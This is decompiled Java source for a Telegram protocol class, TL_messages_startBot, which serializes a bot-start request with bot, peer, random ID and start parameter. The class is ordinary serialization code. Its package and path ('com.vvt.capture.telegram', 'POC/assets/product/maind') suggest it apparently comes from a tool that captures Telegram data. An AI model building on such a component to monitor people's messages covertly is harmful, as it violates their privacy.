package com.vvt.capture.telegram.internal;

public class TLRPC$TL_messages_startBot
  extends TLObject
{
  public static int constructor = -421563528;
  public TLRPC.InputUser bot;
  public TLRPC.InputPeer peer;
  public long random_id;
  public String start_param;
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.Updates.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    this.bot.serializeToStream(paramAbstractSerializedData);
    this.peer.serializeToStream(paramAbstractSerializedData);
    long l = this.random_id;
    paramAbstractSerializedData.writeInt64(l);
    String str = this.start_param;
    paramAbstractSerializedData.writeString(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_messages_startBot.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */